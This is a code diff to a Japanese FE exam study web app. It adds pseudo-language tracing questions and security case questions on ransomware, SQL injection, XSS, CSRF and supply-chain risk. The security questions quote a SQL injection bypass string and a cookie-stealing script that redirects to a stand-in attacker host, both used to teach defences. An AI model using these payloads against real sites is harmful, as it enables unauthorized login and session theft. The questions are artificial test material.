@@ -31,9 +31,9 @@
           <div class="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-xs font-semibold bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 mb-1">
             <span>基本情報技術者試験 (FE)</span>
             <span>•</span>
-            <span>IPAシラバス完全網羅道場</span>
+            <span>科目A・科目B 完全網羅道場</span>
           </div>
-          <h1 class="text-xl md:text-2xl font-bold tracking-tight text-[var(--foreground)]">FE 基礎特化 一問一答</h1>
+          <h1 class="text-xl md:text-2xl font-bold tracking-tight text-[var(--foreground)]">FE 科目A・B 完全攻略道場</h1>
         </div>
 
         <!-- Progress Summary Cards -->
@@ -129,6 +129,9 @@
           <h2 id="q-question-text" class="text-base md:text-lg font-bold leading-relaxed text-[var(--foreground)] mt-1 select-text">
             問題を読み込み中...
           </h2>
+
+          <!-- Code Block / Scenario Container for Kamoku B -->
+          <pre id="q-code-block" class="hidden mt-3 p-3.5 rounded-xl font-mono text-xs md:text-sm overflow-x-auto leading-relaxed whitespace-pre select-text" style="background-color: #0f172a !important; color: #f8fafc !important; border: 2px solid #334155 !important;"></pre>
         </div>
 
         <!-- Options / Flashcard Area -->
@@ -364,6 +367,22 @@
           <p>• <b>BSCの4視点</b>：財務、顧客、内部プロセス、学習と成長。</p>
           <p>• <b>MOTの関門</b>：魔の川(研究→開発)、死の谷(開発→事業化)、ダーウィンの海(事業化→市場競争)。</p>
         </div>
+
+        <div class="p-3 rounded-xl bg-[var(--background)] border border-[var(--border)] space-y-1">
+          <h4 class="font-bold text-indigo-500">22. 科目B：疑似言語トレースの鉄則</h4>
+          <p>• <b>配列は「1始まり」</b>：<code>array[1]</code> が先頭！0から数えない。</p>
+          <p>• <b>代入「←」</b>：右辺の計算結果を左辺の変数に上書き。</p>
+          <p>• <b>リスト挿入</b>：必ず「新ノード.next」を先に繋いでから「前.next」を付け替える。</p>
+          <p>• <b>トレース</b>：頭の中で追わず、紙に変数表を書いて1行ずつ書き換える。</p>
+        </div>
+
+        <div class="p-3 rounded-xl bg-[var(--background)] border border-[var(--border)] space-y-1">
+          <h4 class="font-bold text-rose-500">23. 科目B：セキュリティ事例の鉄板</h4>
+          <p>• <b>マルウェア感染初動</b>：まず<b>ネットワーク隔離（LAN抜く）</b>。電源は切らない。</p>
+          <p>• <b>SQLインジェクション</b>：文字列連結をやめ、<b>プレースホルダ</b>を使う。</p>
+          <p>• <b>XSS対策</b>：HTML特殊文字（&lt; &gt;）の<b>エスケープ処理</b>。</p>
+          <p>• <b>パスワードリスト攻撃</b>：使い回し禁止 ＋ <b>多要素認証(MFA)</b>。</p>
+        </div>
       </div>
     </section>
 
@@ -437,7 +456,7 @@
             <div>
               <div class="flex items-center gap-2">
                 <h3 style="font-size: 18px; font-weight: 900; color: #0f172a !important; margin: 0;">データ管理・端末引き継ぎ</h3>
-                <span style="font-size: 10px; font-weight: 800; background-color: #0f172a; color: #ffffff; padding: 2px 7px; border-radius: 4px;">v5.1最新</span>
+                <span style="font-size: 10px; font-weight: 800; background-color: #0f172a; color: #ffffff; padding: 2px 7px; border-radius: 4px;">v6.0 科目B対応</span>
               </div>
               <p style="font-size: 12px; color: #475569 !important; margin: 2px 0 0 0; font-weight: 600;">スマホとPCの間で学習進捗を簡単に共有・復元できます</p>
             </div>
@@ -497,10 +516,10 @@
               <span>初期問題セットの最新化・リフレッシュ</span>
             </span>
             <p style="font-size: 12px; color: #475569 !important; line-height: 1.5; margin: 0 0 10px 0; font-weight: 600;">
-              もし「問題数が古いまま」「最初からやり直したい」という場合は、公式の最新問題（全125問）にリフレッシュできます。
+              もし「問題数が古いまま」「最初からやり直したい」という場合は、公式の最新問題（全145問）にリフレッシュできます。
             </p>
             <button onclick="restoreDefaults()" style="width: 100%; padding: 10px; border-radius: 10px; border: 2px solid #ef4444 !important; background-color: #ffffff !important; color: #b91c1c !important; font-weight: 800; font-size: 12px; cursor: pointer;">
-              ⚠️ 最新初期問題（全125問）にリセット・同期する
+              ⚠️ 最新初期問題（全145問）にリセット・同期する
             </button>
           </div>
 
@@ -519,7 +538,7 @@
 
   <script>
     // System Data Version for Auto-Update
-    const CURRENT_DATA_VERSION = 5;
+    const CURRENT_DATA_VERSION = 6;
 
     // Comprehensive FE Syllabus-aligned Question Database (125 Questions)
     const defaultQuestions = [
@@ -2647,6 +2666,357 @@
     "answer": 0,
     "reasoning": "新商品が世に出るまでの3大関門ストーリー：\n1. 魔の川（研究 $\\rightarrow$ 開発）：基礎研究を実用技術にできるかの川。\n2. 死の谷（開発 $\\rightarrow$ 事業化）：ラボで試作品ができたが、工場での量産や資金が続かず倒産する谷（ここが一番死にやすい！）。\n3. ダーウィンの海（事業化 $\\rightarrow$ 産業化・生存競争）：市場に出た後、競合他社との弱肉強食のサバイバルを生き残れるかの海。",
     "tip": "『開発から事業化への関門』＝ 死の谷。"
+  },
+  {
+    "id": 3301,
+    "category": "kamoku_b_algo",
+    "categoryName": "科目B：疑似言語",
+    "importance": "★★★",
+    "summary": "IPA疑似言語の配列は「1始まり（1-indexed）」！ 代入「←」は右を左に入れる",
+    "question": "次の疑似言語プログラムを実行したとき、出力される値はどれか？（※配列の要素番号は1から始まる）",
+    "code": "○整数型: array ← {10, 20, 30, 40, 50}\n○整数型: a, b\na ← array[2]\nb ← array[4]\narray[2] ← b\n出力する(array[2] + array[3])",
+    "options": [
+      "70",
+      "50",
+      "60",
+      "90"
+    ],
+    "answer": 0,
+    "reasoning": "文系向け1行トレース：\n⚠️ 絶対に忘れないルール：IPAの配列は「1番目」から数えます（array[1]=10, array[2]=20, array[3]=30, array[4]=40）。\n1. a ← array[2] （aに20が入る）\n2. b ← array[4] （bに40が入る）\n3. array[2] ← b （array[2]の中身が20から40に上書きされる！）\n4. 出力する(array[2] + array[3]) → 40 + 30 = 70！",
+    "tip": "『配列の添字は1から始まる』『← は右の値を左の箱に上書きコピー』の2つだけで解けます。"
+  },
+  {
+    "id": 3302,
+    "category": "kamoku_b_algo",
+    "categoryName": "科目B：疑似言語",
+    "importance": "★★★",
+    "summary": "値の入れ替え（スワップ）には「一時退避用の変数 tmp」が必須！",
+    "question": "変数 x と変数 y の値を入れ替えるプログラムで、空欄 [ a ] に入る正しい処理はどれか？",
+    "code": "○整数型: x ← 10, y ← 25, tmp\ntmp ← x\nx ← y\n[  a  ]",
+    "options": [
+      "y ← tmp",
+      "y ← x",
+      "tmp ← y",
+      "x ← tmp"
+    ],
+    "answer": 0,
+    "reasoning": "コップのジュースの入れ替えと同じです！\n「オレンジ(x)」と「リンゴ(y)」を入れ替えたいのに、直接 `x ← y` するとオレンジが消えてしまいます。そこで空のコップ `tmp` にまずオレンジ(`x`)を避難させます。\n1. `tmp ← x` （tmpに10を避難）\n2. `x ← y` （xに25を入れる）\n3. `y ← tmp` （避難させておいた10をyに入れる）\nこれで x=25, y=10 に入れ替わります！",
+    "tip": "『tmp ← x → x ← y → y ← tmp』のしりとり（x→x, y→y, tmp→tmp）と覚えましょう！"
+  },
+  {
+    "id": 3303,
+    "category": "kamoku_b_algo",
+    "categoryName": "科目B：疑似言語",
+    "importance": "★★★",
+    "summary": "forループのトレース：紙に「i」と「sum」の表を書いて1回ずつ書き換える",
+    "question": "次のプログラムを実行したとき、最後に出力される sum の値はどれか？",
+    "code": "○整数型: i, sum ← 0\nfor (i を 1 から 5 まで 1 ずつ増やす)\n  if (i mod 2 ＝ 1)\n    sum ← sum + i\n  endif\nendfor\n出力する(sum)",
+    "options": [
+      "9",
+      "15",
+      "6",
+      "10"
+    ],
+    "answer": 0,
+    "reasoning": "※ `mod` は「割った余り」です（`i mod 2 ＝ 1` は「2で割った余りが1＝奇数」という意味）。\n1回ずつ表に書くと：\n• i=1: 奇数なので sum = 0 + 1 = 1\n• i=2: 偶数なのでスルー (sum=1)\n• i=3: 奇数なので sum = 1 + 3 = 4\n• i=4: 偶数なのでスルー (sum=4)\n• i=5: 奇数なので sum = 4 + 5 = 9\nしたがって答えは 9 です！",
+    "tip": "『mod 2 ＝ 1』は奇数判定、『mod 2 ＝ 0』は偶数判定。頭の中でやらず必ずメモ用紙にiの表を書くとミスゼロです。"
+  },
+  {
+    "id": 3304,
+    "category": "kamoku_b_algo",
+    "categoryName": "科目B：疑似言語",
+    "importance": "★★★",
+    "summary": "最大値を探すループ：初期値は「配列の1番目」、比較は「array[i] > max」",
+    "question": "配列 data（要素数5）の中から最大値を見つけて返す関数 findMax の空欄 [ a ] に入る条件式はどれか？",
+    "code": "○整数型: findMax(整数型の配列: data)\n  ○整数型: max ← data[1]\n  ○整数型: i\n  for (i を 2 から dataの要素数 まで 1 ずつ増やす)\n    if ([  a  ])\n      max ← data[i]\n    endif\n  endfor\n  return max",
+    "options": [
+      "data[i] ＞ max",
+      "data[i] ＜ max",
+      "data[i] ＝ max",
+      "max ＞ data[i]"
+    ],
+    "answer": 0,
+    "reasoning": "『チャンピオン防衛戦』のイメージです！\nまず1番目の人 `data[1]` を仮チャンピオン（`max`）にします。2番目以降の人 `data[i]` が挑戦してきて、「挑戦者 `data[i]` が今のチャンピオン `max` より大きければ（`data[i] > max`）」、新チャンピオンに交代（`max ← data[i]`）します！",
+    "tip": "最大値探索なら『挑戦者 > チャンピオン』、最小値探索なら『挑戦者 < チャンピオン』。"
+  },
+  {
+    "id": 3305,
+    "category": "kamoku_b_algo",
+    "categoryName": "科目B：疑似言語",
+    "importance": "★★★",
+    "summary": "ユークリッドの互除法：大きい方を小さい方で割った「余り」を繰り返す",
+    "question": "2つの正の整数 a と b の最大公約数を求める関数 gcd(24, 18) を呼び出したとき、whileループは何回実行されるか？（※modは剰余）",
+    "code": "○整数型: gcd(整数型: a, 整数型: b)\n  ○整数型: r\n  while (b ≠ 0)\n    r ← a mod b\n    a ← b\n    b ← r\n  endwhile\n  return a",
+    "options": [
+      "2回",
+      "3回",
+      "1回",
+      "4回"
+    ],
+    "answer": 0,
+    "reasoning": "変数の動きを1行ずつ追います（初期状態: a=24, b=18）：\n【1回目】b=18≠0 なので実行！\n  r = 24 mod 18 = 6\n  a = 18, b = 6\n【2回目】b=6≠0 なので実行！\n  r = 18 mod 6 = 0\n  a = 6, b = 0\n【判定】b=0 になったのでwhileループ終了！答えの6を返す。\nよって実行回数は「2回」です。",
+    "tip": "ユークリッドの互除法は科目Bの超定番。ループ回数や変数の途中経過をよく聞かれます。"
+  },
+  {
+    "id": 3306,
+    "category": "kamoku_b_algo",
+    "categoryName": "科目B：疑似言語",
+    "importance": "★★★",
+    "summary": "再帰関数のトレース：紙に「階段（箱）」を書いて戻り値を下から順に計算する",
+    "question": "次の再帰関数 calc(4) を呼び出したときの戻り値はどれか？",
+    "code": "○整数型: calc(整数型: n)\n  if (n ≦ 1)\n    return 1\n  endif\n  return n + calc(n - 1)",
+    "options": [
+      "10",
+      "24",
+      "4",
+      "6"
+    ],
+    "answer": 0,
+    "reasoning": "『階段を降りて、下から戻ってくる』トレース法：\n• calc(4) = 4 + calc(3)\n• calc(3) = 3 + calc(2)\n• calc(2) = 2 + calc(1)\n• calc(1) = 1 （ここで `n <= 1` なので止まって 1 を返す！）\nここから下から順番に当てはめて戻ります：\n• calc(2) = 2 + 1 = 3\n• calc(3) = 3 + 3 = 6\n• calc(4) = 4 + 6 = 10！",
+    "tip": "再帰は一気に計算しようとせず、まずは一番底（終了条件）まで展開してから下から計算し直すと絶対に間違えません。"
+  },
+  {
+    "id": 3307,
+    "category": "kamoku_b_algo",
+    "categoryName": "科目B：疑似言語",
+    "importance": "★★★",
+    "summary": "2分探索の境界更新：midが正解より小さければ、探索開始(low)を「mid + 1」にする",
+    "question": "昇順に並んだ配列 data から target を探す2分探索プログラムの空欄 [ a ] と [ b ] の正しい組み合わせはどれか？",
+    "code": "○整数型: low ← 1, high ← dataの要素数, mid\nwhile (low ≦ high)\n  mid ← (low + high) ÷ 2 の商\n  if (data[mid] ＝ target)\n    return mid\n  elseif (data[mid] ＜ target)\n    [  a  ]\n  else\n    [  b  ]\n  endif\nendwhile",
+    "options": [
+      "a: low ← mid + 1 ／ b: high ← mid - 1",
+      "a: low ← mid ／ b: high ← mid",
+      "a: high ← mid - 1 ／ b: low ← mid + 1",
+      "a: low ← mid - 1 ／ b: high ← mid + 1"
+    ],
+    "answer": 0,
+    "reasoning": "辞書をめくった場面を想像してください！\n探したい言葉（target）より真ん中の言葉（data[mid]）の方が「小さい（前の方にある）」とき、目的の言葉は『真ん中より右側（後ろ）』にあります！\nつまり左半分（1〜midまで）はもう全部用済みなので、探す範囲の左端 `low` を `mid + 1` にグッと右へ狭めます。\n逆に大きすぎたら右半分が不要なので、右端 `high` を `mid - 1` に狭めます。",
+    "tip": "すでに `data[mid]` は `target` でないことが確認済みなので、必ず `+1` と `-1` をつけて `mid` 自身を除外します（無限ループ防止）！"
+  },
+  {
+    "id": 3308,
+    "category": "kamoku_b_algo",
+    "categoryName": "科目B：疑似言語",
+    "importance": "★★★",
+    "summary": "連結リストの要素挿入：まず「新ノードのnext」を先に繋いでから、前のノードを繋ぎ変える！",
+    "question": "単方向連結リストにおいて、要素 prev の直後に新しい要素 newNode を挿入するプログラムがある。リンク切れを起こさない正しい実行順序はどれか？（※各要素は次の要素への参照 next を持つ）",
+    "code": "// 状態: prev → nextNode\n// 目標: prev → newNode → nextNode にする\n[  1行目  ]\n[  2行目  ]",
+    "options": [
+      "1行目: newNode.next ← prev.next ／ 2行目: prev.next ← newNode",
+      "1行目: prev.next ← newNode ／ 2行目: newNode.next ← prev.next",
+      "1行目: prev.next ← newNode.next ／ 2行目: newNode.next ← prev",
+      "1行目: newNode.next ← prev ／ 2行目: prev.next ← newNode"
+    ],
+    "answer": 0,
+    "reasoning": "手をつないで並んでいる列に割り込むイメージ！\nもし先に `prev.next ← newNode` をやってしまうと、「元々 prev が繋いでいた後ろの人（nextNode）の住所」が上書きされて消失し、後ろの列車が全部迷子（リンク切れ）になってしまいます！\nだから**必ず最初に「割り込む新人の右手（newNode.next）」を後ろの人（prev.next）に繋いでから**、前の人の手（prev.next）を新人に繋ぎ直します。",
+    "tip": "『新しいノードの次を先に繋いでから、前のノードを付け替える』。科目Bリスト問題の絶対鉄則です！"
+  },
+  {
+    "id": 3309,
+    "category": "kamoku_b_algo",
+    "categoryName": "科目B：疑似言語",
+    "importance": "★★★",
+    "summary": "2次元配列（表）の走査：外側ループが行(row)、内側ループが列(col)を回るのが基本",
+    "question": "次の2次元配列 matrix（3行3列）に対してプログラムを実行したとき、出力される total の値はどれか？",
+    "code": "○整数型配列の配列: matrix ← {{1, 2, 3}, {4, 5, 6}, {7, 8, 9}}\n○整数型: i, total ← 0\nfor (i を 1 から 3 まで 1 ずつ増やす)\n  total ← total + matrix[i][i]\nendfor\n出力する(total)",
+    "options": [
+      "15",
+      "45",
+      "12",
+      "18"
+    ],
+    "answer": 0,
+    "reasoning": "2次元配列 `matrix[行][列]` で、`matrix[i][i]` のように行番号と列番号が同じ場所は「左上から右下への対角線」を指します！\n• i=1: `matrix[1][1]` = 1\n• i=2: `matrix[2][2]` = 5\n• i=3: `matrix[3][3]` = 9\n足すと `1 + 5 + 9 = 15` です！",
+    "tip": "1次元目の[ ]が「行（縦の位置）」、2次元目の[ ]が「列（横の位置）」。"
+  },
+  {
+    "id": 3310,
+    "category": "kamoku_b_algo",
+    "categoryName": "科目B：疑似言語",
+    "importance": "★★☆",
+    "summary": "バブルソート ＝ 隣り合う要素を比べて、逆転していれば入れ替えるを繰り返す",
+    "question": "配列 `{4, 2, 5, 1}` を昇順（小さい順）に並べるバブルソート（先頭から末尾に向かって隣同士を比較し、左＞右なら交換）を先頭から1パス（1周）だけ実行した直後の配列はどれか？",
+    "options": [
+      "{2, 4, 1, 5}",
+      "{1, 2, 4, 5}",
+      "{2, 1, 4, 5}",
+      "{4, 2, 1, 5}"
+    ],
+    "answer": 0,
+    "reasoning": "左から順番に隣同士を比べていきます：\n初期：`{4, 2, 5, 1}`\n1. 1番目と2番目（4と2）：4>2 なので交換 → `{2, 4, 5, 1}`\n2. 2番目と3番目（4と5）：4<5 なのでそのまま → `{2, 4, 5, 1}`\n3. 3番目と4番目（5と1）：5>1 なので交換 → `{2, 4, 1, 5}`\n1周終わると、一番大きい「5」が泡（バブル）のように一番右端に浮き上がります！",
+    "tip": "バブルソートは1周するごとに「一番大きい値が一番右端に確定する」性質があります。"
+  },
+  {
+    "id": 3311,
+    "category": "kamoku_b_algo",
+    "categoryName": "科目B：疑似言語",
+    "importance": "★★☆",
+    "summary": "スタック操作のトレース：Pushで上に積み、Popで一番上から取り出す",
+    "question": "空のスタックに対して、`push(3)`, `push(5)`, `pop()`, `push(8)`, `push(2)`, `pop()`, `pop()` の順に操作を行ったとき、最後にpopで取り出された値はどれか？",
+    "options": [
+      "8",
+      "2",
+      "5",
+      "3"
+    ],
+    "answer": 0,
+    "reasoning": "お皿の積み重ねを1つずつ書きます：\n1. `push(3)` → [3]\n2. `push(5)` → [3, 5]\n3. `pop()` → 一番上の 5 を取り出す！残り: [3]\n4. `push(8)` → [3, 8]\n5. `push(2)` → [3, 8, 2]\n6. `pop()` → 一番上の 2 を取り出す！残り: [3, 8]\n7. `pop()` → 一番上の 8 を取り出す！残り: [3]\nよって最後に取り出された値は 8 です。",
+    "tip": "必ず左から右に `[ ]` の絵を描いて、右端（一番上）から出し入れすれば100%正解できます。"
+  },
+  {
+    "id": 3312,
+    "category": "kamoku_b_algo",
+    "categoryName": "科目B：疑似言語",
+    "importance": "★★☆",
+    "summary": "関数の値渡し（Call by Value）：関数内で引数を書き換えても呼び出し元の変数は変わらない",
+    "question": "次の疑似言語プログラムを実行したとき、出力される x の値はどれか？（※引数は値渡しとする）",
+    "code": "○手続き: change(整数型: n)\n  n ← n * 2\n\n○手続き: main()\n  ○整数型: x ← 10\n  change(x)\n  出力する(x)",
+    "options": [
+      "10",
+      "20",
+      "0",
+      "エラーになる"
+    ],
+    "answer": 0,
+    "reasoning": "『値渡し（コピー渡し）』の落とし穴です！\n`change(x)` を呼んだとき、mainの変数 `x` そのものではなく、「数字の 10 というコピー用紙」だけが `change` 関数の `n` に渡されます。\n`change` の中で `n` を2倍して20にしても、それはコピー用紙を書き換えただけなので、元の `main` にある原本 `x` はずっと 10 のままです！",
+    "tip": "値渡し＝原本のコピーを渡すので、呼び出し元の値は変化しません（配列やオブジェクトの参照渡しは変化します）。"
+  },
+  {
+    "id": 3313,
+    "category": "kamoku_b_algo",
+    "categoryName": "科目B：疑似言語",
+    "importance": "★★☆",
+    "summary": "文字列の文字数・部分一致：1文字目からずらしながら全文字一致するか調べる",
+    "question": "配列 `text`（長さ5）の中に、指定された文字 `c` が「何個含まれているか」を数えるプログラムの空欄 [ a ] に入る処理はどれか？",
+    "code": "○整数型: count ← 0, i\nfor (i を 1 から 5 まで 1 ずつ増やす)\n  if (text[i] ＝ c)\n    [  a  ]\n  endif\nendfor",
+    "options": [
+      "count ← count + 1",
+      "count ← count + i",
+      "count ← 1",
+      "i ← i + 1"
+    ],
+    "answer": 0,
+    "reasoning": "個数を数える（カウントアップ）基本パターンです。\n一致する文字が見つかるたびに、カウンター変数 `count` の中身を1つ増やすので `count ← count + 1` と書きます（`count ← count + i` だと番号を足してしまい合計値計算になってしまいます）。",
+    "tip": "『個数を数える』＝ `count ← count + 1`、『合計を出す』＝ `sum ← sum + data[i]`。"
+  },
+  {
+    "id": 3401,
+    "category": "kamoku_b_sec",
+    "categoryName": "科目B：セキュリティ事例",
+    "importance": "★★★",
+    "summary": "ランサムウェア感染時の最優先初動 ＝ ネットワークから隔離（LANケーブル抜く/Wi-Fi切断）！",
+    "question": "【事例】社内PCの1台が「ファイルが暗号化され身代金を要求する画面（ランサムウェア）」に感染したことが判明した。被害拡大を防ぐため、情報システム担当者が現場に指示する「最優先の初動対応」はどれか？",
+    "options": [
+      "感染したPCのLANケーブルを抜く（またはWi-Fiをオフにし）、直ちに社内ネットワークから隔離する",
+      "感染したPCの電源を直ちに強制シャットダウン（コンセント引き抜き）する",
+      "犯人に身代金を支払って復号キーを受け取る準備を始める",
+      "感染したPC上でOSの再インストール（初期化）を直ちに実行する"
+    ],
+    "answer": 0,
+    "reasoning": "科目Bセキュリティの鉄板シナリオ！\nランサムウェアはネットワーク経由で同じ社内の共有サーバーや他の社員のPCへ次々と感染を広げて暗号化してしまいます。だから**何よりもまず「ネットワークからの隔離（通信遮断）」が最優先**です！\n（※電源を強制切断すると、メモリ上に残っている犯人の痕跡ログや復号の手がかりが消えてしまい、フォレンジック調査ができなくなるためNGです）",
+    "tip": "『マルウェア感染発覚時の初動 ＝ まずネットワーク遮断（隔離）。電源は切らない』！"
+  },
+  {
+    "id": 3402,
+    "category": "kamoku_b_sec",
+    "categoryName": "科目B：セキュリティ事例",
+    "importance": "★★★",
+    "summary": "SQLインジェクションの根本対策 ＝ プレースホルダ（バインド機構）の使用！",
+    "question": "【事例】Webアプリのログイン画面で、入力欄に `' OR '1'='1` のような文字列を入力すると不正ログインできてしまう脆弱性（SQLインジェクション）が見つかった。アプリ改修における「根本的な対策」はどれか？",
+    "options": [
+      "SQL文の組み立てに文字列連結を使わず、プレースホルダ（プリペアドステートメント）によるバインド機構を使用する",
+      "入力フォームの文字数制限を10文字以内に設定する",
+      "Webブラウザ側（JavaScript）でシングルクォーテーション入力を禁止する",
+      "データベースのテーブル名を分かりにくい暗号名に変更する"
+    ],
+    "answer": 0,
+    "reasoning": "SQLインジェクションは、ユーザー入力をそのままSQL命令文の文字列にくっつけてしまうから起きます。\n『プレースホルダ（バインド機構）』を使うと、「ここは命令文ではなく、ただの文字データを入れる空欄（`?`）ですよ」とDBに教えてから値を渡すため、どんな悪意ある記号が入ってもSQL命令として実行されなくなります。\n（※JavaScript側のチェックはブラウザ開発者ツールで簡単にバイパスできるので根本対策になりません）",
+    "tip": "『SQLインジェクションの根本対策 ＝ プレースホルダ（バインド機構）』は科目Bの頻出知識！"
+  },
+  {
+    "id": 3403,
+    "category": "kamoku_b_sec",
+    "categoryName": "科目B：セキュリティ事例",
+    "importance": "★★★",
+    "summary": "XSS（クロスサイトスクリプティング）の対策 ＝ HTML特殊文字のエスケープ処理！",
+    "question": "【事例】掲示板アプリにおいて、悪意あるユーザーが `\u003cscript>location.href='http://evil.example/...'\u003c/script>` と書き込むと、他の閲覧者のブラウザでスクリプトが勝手に実行されCookieが盗まれる問題が発生した。適切な根本対策はどれか？",
+    "options": [
+      "入力された文字列をWebページに出力する際、`<` や `>` などの特殊文字を無害な文字参照（`&lt;` 等）に変換するエスケープ処理を行う",
+      "掲示板の通信をHTTPS化する",
+      "Cookieに有効期限（10分間）を設定する",
+      "WebサーバーのOSを最新版にアップデートする"
+    ],
+    "answer": 0,
+    "reasoning": "まさに先ほどこのアプリ自体に実装した対策と同じです！\nHTMLの画面に出力するときに `<` や `>` や `&` を単なる文字（`&lt;` など）にエスケープ（無害化）してしまえば、ブラウザがプログラムのタグだと勘違いして実行することが一切なくなります。さらに追加対策としてCookieに `HttpOnly` 属性をつけるとJSからCookieを読めなくなります。",
+    "tip": "『XSS（スクリプト実行）の根本対策 ＝ 出力時のHTMLエスケープ処理（＋HttpOnly属性）』。"
+  },
+  {
+    "id": 3404,
+    "category": "kamoku_b_sec",
+    "categoryName": "科目B：セキュリティ事例",
+    "importance": "★★★",
+    "summary": "パスワードリスト攻撃への対策 ＝ 他サービスとの使い回し禁止 ＋ 多要素認証 (MFA)",
+    "question": "【事例】他社のWebサービスから流出したIDとパスワードのリストを用いて、自社の会員サイトに一斉にログインを試みる「パスワードリスト攻撃」が急増している。サービス運営側がユーザーやシステムに施すべき最も有効な対策はどれか？",
+    "options": [
+      "SMSや認証アプリなどを用いた多要素認証（MFA）を導入し、パスワードの使い回しをしないよう啓発する",
+      "パスワードの最小文字数を4文字以上に緩和する",
+      "すべての会員のIDを連番の数字に変更する",
+      "Webサイトの画面上に「不正ログイン禁止」という警告バナーを表示する"
+    ],
+    "answer": 0,
+    "reasoning": "パスワードリスト攻撃は「正しいIDと正しいパスワード（他社サイトと同じもの）」を使ってログインしてくるため、入力されたパスワード自体は正規のものと一致してしまいます。\nだからパスワード文字数ルールを多少変えても防げません！『パスワード以外の要素（スマホのワンタイムコード等＝多要素認証）』を要求することで初めて不正ログインを止められます。",
+    "tip": "『他社流出リストを使ったログイン攻撃（パスワードリスト攻撃）への特効薬 ＝ 多要素認証（MFA）＋使い回し禁止』。"
+  },
+  {
+    "id": 3405,
+    "category": "kamoku_b_sec",
+    "categoryName": "科目B：セキュリティ事例",
+    "importance": "★★☆",
+    "summary": "CSRF（クロスサイトリクエストフォージェリ）対策 ＝ ワンタイムトークンの検証",
+    "question": "【事例】ECサイトにログイン中のユーザーが、悪意ある罠サイト上のリンクをクリックしただけで、本人の意図しない商品購入やパスワード変更リクエストがECサイトへ送信されてしまう（CSRF）脆弱性が見つかった。適切な対策はどれか？",
+    "options": [
+      "正規の入力画面から送信されたリクエストであることを証明するため、推測困難な秘密のトークン（CSRFトークン）をフォームに埋め込みサーバー側で照合する",
+      "パスワードをデータベースにハッシュ化して保存する",
+      "ログイン画面に画像認証（CAPTCHA）を設置する",
+      "Webサーバーのファイアウォールで80番ポートを閉じる"
+    ],
+    "answer": 0,
+    "reasoning": "CSRFは「ログイン中の会員のブラウザ」を乗っ取って勝手に購入ボタンのリクエストを偽造して送りつける攻撃です。\n対策は『本当に正規の購入確認ページから押されたのか？』を確認すること。サーバーがあらかじめ正規ページに「合言葉（推測不能なCSRFトークン）」を配っておき、送信時に合言葉が一致しない罠サイトからのリクエストをすべて弾きます。",
+    "tip": "『意図しない処理の勝手な送信（CSRF）への対策 ＝ 推測困難なトークン検証（＋処理前のパスワード再入力）』。"
+  },
+  {
+    "id": 3406,
+    "category": "kamoku_b_sec",
+    "categoryName": "科目B：セキュリティ事例",
+    "importance": "★★☆",
+    "summary": "クラウドの設定ミス防止 ＝ 最小権限の原則（必要な人・必要な範囲だけにアクセス許可）",
+    "question": "【事例】クラウドストレージ（S3等）に保管していた顧客リストが、外部から誰でも閲覧可能な状態になっており情報漏洩が起きた。再発防止のためのアクセス制御の原則として、最も適切なものはどれか？",
+    "options": [
+      "最小権限の原則に基づき、業務上アクセスが必須な特定ユーザー・システムのみに必要最小限の権限を付与し、デフォルトは非公開とする",
+      "利便性を優先し、社内の全社員に管理者権限（フルアクセス権）を付与する",
+      "ストレージのURLをランダムな6文字にして他人に推測されにくくする（URL秘匿のみ）",
+      "顧客リストのファイル名を「非公開資料.csv」に変更する"
+    ],
+    "answer": 0,
+    "reasoning": "クラウド事故の原因第1位が「公開設定（パブリック設定）のうっかりミス」です。\nセキュリティの大原則は『最小権限の原則（Least Privilege）』と『デフォルト拒否（Default Deny）』。必要な人に、必要な権限だけを、必要な期間だけ与えるのが鉄則です。",
+    "tip": "『URLを隠すだけ（セキュリティ・バイ・オブスキュリティ）』は対策になりません。必ず『最小権限の原則』を選びます。"
+  },
+  {
+    "id": 3407,
+    "category": "kamoku_b_sec",
+    "categoryName": "科目B：セキュリティ事例",
+    "importance": "★★☆",
+    "summary": "委託先やOSSライブラリの脆弱性 ＝ サプライチェーン全体の脆弱性管理（SBOM等）",
+    "question": "【事例】自社で開発しているWebアプリ自体は問題なかったが、アプリ内で組み込んで使用していたオープンソースソフトウェア（OSS）のライブラリに深刻な脆弱性（Log4j等）が発見され、そこを突かれてサーバーが乗っ取られた。このようなリスクを管理するための対策はどれか？",
+    "options": [
+      "システム内で使用しているすべての外部ライブラリやコンポーネントの一覧（SBOM等）を把握・管理し、脆弱性情報が公開され次第速やかにパッチ適用やバージョンアップを行う",
+      "外部のOSSライブラリは今後一切使用せず、OSからすべて自社でゼロから開発する",
+      "脆弱性が発見されたサーバーのIPアドレスを変更する",
+      "自社のシステム開発メンバーのパスワードを毎月変更する"
+    ],
+    "answer": 0,
+    "reasoning": "現代のシステムは、外部の便利な部品（OSSライブラリ）や委託先のシステムを多数組み合わせて作られています。部品のどれか1つに欠陥があると、自社システム全体が攻撃されます（サプライチェーン攻撃・脆弱性）。そのため『どんな部品（ライブラリとバージョン）を使っているかの部品表（SBOM）を常に管理し、すぐアップデートできる体制』が必須です。",
+    "tip": "『外部ライブラリ・部品の脆弱性対策 ＝ 使用部品・バージョンの継続的な把握（SBOM）と迅速なパッチ適用』。"
   }
 ];
 
@@ -2678,7 +3048,7 @@
     function initData() {
       try {
         const storedVersion = localStorage.getItem('fe_data_version');
-        const storedQuestions = localStorage.getItem('fe_custom_questions_v5');
+        const storedQuestions = localStorage.getItem('fe_custom_questions_v6');
 
         // If version is older or not set, overwrite with full latest official set
         if (!storedVersion || parseInt(storedVersion) < CURRENT_DATA_VERSION) {
@@ -2704,7 +3074,7 @@
 
     function saveAllQuestions() {
       try {
-        localStorage.setItem('fe_custom_questions_v5', JSON.stringify(allQuestions));
+        localStorage.setItem('fe_custom_questions_v6', JSON.stringify(allQuestions));
       } catch (e) {}
     }
 
@@ -2745,6 +3115,11 @@
       const learningCount = userStats.learning.size;
       cats.set('needs_review', '⚠️ 要復習のみ (' + learningCount + ')');
 
+      const kamokuBCount = allQuestions.filter(q => q.category && q.category.startsWith('kamoku_b_')).length;
+      if (kamokuBCount > 0) {
+        cats.set('kamoku_b_all', '📘 科目Bすべて (' + kamokuBCount + ')');
+      }
+
       allQuestions.forEach(q => {
         if (!cats.has(q.category)) {
           cats.set(q.category, q.categoryName || q.category);
@@ -2763,6 +3138,9 @@
         if (key === 'needs_review') {
           inactiveClass = "filter-btn px-2.5 py-1 rounded-lg text-xs font-semibold bg-amber-500/10 text-amber-600 dark:text-amber-400 border border-amber-500/30 whitespace-nowrap";
